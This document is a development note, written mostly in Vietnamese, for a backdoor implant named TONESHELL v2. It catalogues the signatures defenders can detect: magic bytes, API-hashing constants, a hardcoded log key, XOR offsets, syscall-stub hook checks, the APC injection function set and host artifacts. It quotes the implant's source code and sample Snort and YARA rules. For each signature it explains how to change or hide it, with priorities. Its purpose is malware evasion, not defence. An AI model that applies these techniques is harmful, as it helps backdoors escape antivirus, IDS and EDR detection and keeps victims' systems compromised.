# TONESHELL v2 — Evasion Analysis

Static patterns detectable per layer, với source location và cách sửa. Không trùng với `plan.md` (injection chain + jitter đã ghi ở đó).

---

## Layer 1 — Network wire

### 1.1 Magic bytes `0x18 0x04 0x04`

**Source:** `src/shellcode/comms.cpp`
- `SetClientMsg` line 329: `unsigned char magic[3] = {0x18, 0x04, 0x04};`
- `ValidateMagic` line 367: `unsigned char magic[3] = {0x18, 0x04, 0x04};`

**Pattern:** Bytes đầu tiên của mọi packet cả 2 chiều (client→server và server→client), plaintext, không bao giờ encrypted.

**Detection rule example:**
```
alert tcp any any -> any 8443 (content:"|18 04 04|"; offset:0; depth:3; msg:"TONESHELL magic";)
```

**Trạng thái: ✅ ĐÃ FIX** — magic bytes hiện là compile-time define.

Đổi trong `CMakePresets.json`:
```json
"TONESHELL_MAGIC_0": "0x18",
"TONESHELL_MAGIC_1": "0x04",
"TONESHELL_MAGIC_2": "0x04"
```

Hoặc override khi configure:
```
cmake --preset default -DTONESHELL_MAGIC_0=0xAB -DTONESHELL_MAGIC_1=0xCD -DTONESHELL_MAGIC_2=0xEF
```

Nếu muốn dynamic (derive từ session state): cần refactor `ValidateMagic` để không dùng constant — effort cao hơn.

---

### 1.2 Packet structure — 256-byte key field

**Source:** `src/shellcode/comms.hpp`
```cpp
#define ENC_KEY_LEN 256

struct client_message {
    unsigned char magic[3];        // offset 0
    unsigned char payload_size[2]; // offset 3
    unsigned char enc_key[256];    // offset 5  ← luôn 256 byte plaintext
    unsigned char victim_id[16];   // offset 261
    ...
};
```

**Pattern:** Mọi packet client→server đều có 256-byte block tại offset 5, plaintext (đây là encryption key gửi kèm). Detectable bằng packet length heuristic hoặc entropy analysis (256 byte entropy cao ngay sau 5 byte header).

**Cách ẩn:**
- Giảm `ENC_KEY_LEN` xuống (64 hoặc 128) — đổi 1 define, rebuild.
- Dùng variable-length key — cần refactor `GetClientMsgSize` và `CommsCryptInPlace` call site.
- Hybrid scheme: ECDH key exchange → derive session key → bỏ gửi key trong packet (xem `plan.md` mục "asymmetric feasibility"). Effort cao.

---

### 1.3 Default port 8443 raw TCP

**Source:** CMake define `PORT` — configurable, không phải static IoC của code.

**Lưu ý:** 8443 thường associate với HTTPS alternative, raw TCP (không có TLS handshake) trên port này là anomaly. Detection: TLS fingerprinting absent trên 8443.

**Cách ẩn:** Đổi port (CMake define) + wrap trong TLS (thay đổi lớn — cần thêm TLS library trong shellcode PIC context, không trivial).

---

## Layer 2 — Binary static

### 2.1 FNV1A hash constants

**Source:** `src/common/fnv1a.hpp`
```cpp
constexpr uint32_t val_32_const  = 0x811c9dc5;  // FNV offset basis
constexpr uint32_t prime_32_const = 0x1000193;  // FNV prime
```

**Dùng ở:** Mọi API resolution trong cả wsdapi.dll và shellcode (thay LoadLibrary/GetProcAddress). Hai constant này xuất hiện liền nhau trong binary → YARA-ready.

**YARA example:**
```yara
rule TONESHELL_FNV1A {
    strings:
        $fnv = { C5 9D 1C 81 93 01 00 01 }
    condition:
        $fnv
}
```

**Cách ẩn:**
- Thay bằng hash algorithm khác (djb2: multiplier `0x1000193` → `31` hoặc `33`; SipHash; custom polynomial).
- Hoặc giữ FNV1A nhưng dùng variant với seed khác nhau — thay đổi `val_32_const`.
- Phải cập nhật tất cả precomputed hash values trong call site (`by_fnv1a()`).

---

### 2.2 AES-CTR hardcoded key (log file)

**Source:** `src/common/pi_aes_ctr.cpp` — `KeyExpansion`, lines 118-123:
```cpp
uint8_t key_mask[32] = {
    0x15,0x0d,0x17,0x1e,0x48,0xa9,0xcf,0xf7,
    0x36,0x13,0x6b,0xfb,0x8c,0xb0,0x76,0x5f,
    0x50,0x9f,0x2d,0x71,0x88,0xb1,0x72,0xcf,
    0x56,0x2f,0xe0,0x63,0xe3,0xc8,0xb3,0x9b
};
```
Actual key (sau XOR bỏ mask per-dword): `1e170d15 f7cfa948 fb6b1336 5f76b08c 712d9f50 cf72b188 63e02f56 9bb3c8e3`

**Dùng ở:** Encrypt `wsdapih.log` — không ảnh hưởng C2 comms.

**Detection:** Key match trong binary hoặc dùng key đã biết để decrypt log sample.

**Cách ẩn:**
- Derive key tại runtime (hostname hash, volume serial, compile timestamp XOR seed).
- Key derivation logic thêm vào `logger.cpp` trước `PI_AesCtrCrypt` call (line 181).
- Tradeoff: offline log decryption mất đi (không còn biết key trước).

---

### 2.3 TripleXor round offsets `0, 1, 7`

**Source:** `src/common/xor.cpp` — `TripleXorInPlace`:
```cpp
XorInPlace(input, input_len, key, key_len, 0);  // round 1
XorInPlace(input, input_len, key, key_len, 1);  // round 2
XorInPlace(input, input_len, key, key_len, 7);  // round 3
```

**Dùng ở:** Decrypt shellcode blob trong `wsdapi.dll` trước khi inject. Cần packer (offline) và loader (runtime) cùng offset set.

**Detection:** Reversed: decrypt shellcode sample với offset `{0,1,7}` → reveal shellcode pattern.

**Cách ẩn:** Đổi sang offset set khác (e.g., `{0, 3, 11}`). Phải cập nhật packer script (`Build.md` section encrypt) cùng lúc.

---

### 2.4 String obfuscation — compile-time XOR, per-build key

**Source:** `src/common/obfuscation.hpp`
```cpp
#define OBF_RAND_SEED ((__TIME__[7] - '0') * 1 + ...)  // seconds from compile time
constexpr int LinearCongruentGenerator(int Rounds) {
    return 1013904223 + 1664525 * (...);  // Numerical Recipes LCG
}
```

**Pattern:** LCG constants `1013904223` (`0x3C6EF35F`) và `1664525` (`0x19660D`) cố định qua mọi build. Key bản thân thay đổi mỗi build (seed từ `__TIME__`).

**Detection:** LCG constants trong binary → nhận diện obfuscation scheme, có thể bruteforce 86400 seed values (giây trong ngày).

**Cách ẩn:**
- Đổi LCG constants.
- Hoặc dùng `__DATE__` thêm vào seed để mở rộng search space.
- Hoặc thay bằng obfuscation scheme khác (stack string, compile-time AES).

---

## Layer 3 — Assembly / runtime

### 3.1 Halos Gate hook detection pattern

**Source:** `src/common/syscalls.cpp` — `is_syscall_stub`:
```cpp
static bool is_syscall_stub(const uint8_t* addr) {
    if (addr[0] == 0xE9) return false;              // JMP → hooked
    if (addr[0] == 0xEB) return false;              // short JMP → hooked
    if (addr[0] == 0x4C && addr[1] == 0x8B &&
        addr[2] == 0xD1 && addr[3] == 0xB8)        // mov r10,rcx; mov eax,ssn → clean
        return true;
    return false;
}
```

**Pattern:** `4C 8B D1 B8` là clean syscall stub prologue của Windows x64 — thuộc về Windows, không thể đổi. Cái detectable là **hành vi** đọc ntdll export table + so sánh byte đầu của mỗi stub — behavioral IoC ở EDR level.

**Neighbor scan bound:** `for (int d = 1; d < 100; d++)` — hard limit 100 neighbor.

**Cách ẩn:**
- Hook detection logic không thể ẩn bytes `4C 8B D1 B8` (của Windows). Có thể đổi detection method (compare full 8-byte stub thay vì chỉ byte 0).
- Thay Halos Gate bằng technique khác: trực tiếp scan `.text` của ntdll từ disk (syscall numbers ổn định trong cùng OS build), hoặc dùng `NtQuerySystemInformation` để lấy SSN qua kernel.
- Tăng/đổi neighbor bound từ `100` sang giá trị khác.

---

### 3.2 Fixed set 5 Nt functions

**Source:** `src/common/syscalls.cpp` — `InitSyscalls()`:
```cpp
const char* target_names[] = {
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtQueueApcThread",
    "NtResumeThread"
};
```

**Pattern:** Set 5 hàm này đặc trưng cho Early Bird APC injection pattern. Behavioral detection: cùng process resolve đúng 5 Nt* này từ ntdll trong khoảng thời gian ngắn.

**Cách ẩn:**
- Thêm dummy resolve các Nt* khác không dùng để blur set.
- Resolve tất cả Nt*/Zw* (đã làm một phần trong export scan loop), chỉ patch 5 cái cần thiết.

---

### 3.3 SSN patch offset cố định

**Source:** `src/common/syscalls.cpp` — `patch_stub`:
```cpp
static void patch_stub(uint8_t* stub_addr, uint32_t ssn) {
    ...
    *reinterpret_cast<uint32_t*>(stub_addr + 4) = ssn;  // offset 4 = B8 ?? ?? ?? ??
    ...
}
```

`stub_addr + 4` là dword sau `B8` opcode (`mov eax, imm32`). Cố định vì đây là layout của Windows x64 syscall stub — không thể đổi.

---

## Layer 4 — Host artifacts

| Artifact | Source location | Cách ẩn |
|---|---|---|
| `Web.CompressShaders.config` | `shellcode_util_id_d.cpp` (victim ID path) | Compile-time define → đổi path |
| `wsdapih.log` | `SH_LOG_FILE` CMake define | Đổi tên hoặc disable logging trong production build |
| `waitfor.exe /T 99999 Evt8a3f1d7c2e` | `inject.cpp` CreateProcessW args | Randomize event name tại runtime |
| Process chain `EssosUpdate.exe → waitfor.exe` | Thiết kế chain | Thay host process (e.g., `svchost.exe`, `RuntimeBroker.exe`) |

---

## Tổng kết — Priority

| Pattern | Effort sửa | Detection value | Ưu tiên |
|---|---|---|---|
| Magic bytes `0x18 0x04 0x04` | Rất thấp (2 dòng) | Rất cao (network YARA/Snort) | **1** |
| FNV1A constants `0x811c9dc5 / 0x1000193` | Thấp (đổi algo) | Cao (binary YARA) | **2** |
| AES-CTR key log | Thấp (derive runtime) | Trung bình (file IoC) | **3** |
| TripleXor offsets `0,1,7` | Thấp (đổi set) | Trung bình (shellcode fingerprint) | **4** |
| 256-byte key field offset 5 | Trung bình (refactor struct) | Trung bình (packet heuristic) | **5** |
| Host paths/names | Thấp (compile-time) | Thấp–trung bình | **6** |
| LCG constants string obfuscation | Thấp | Thấp (bruteforceable anyway) | **7** |
| Halos Gate behavior | Cao (thay technique) | Trung bình (EDR behavioral) | **8** |
| Nt* function set | Thấp (add dummies) | Trung bình (EDR behavioral) | **9** |
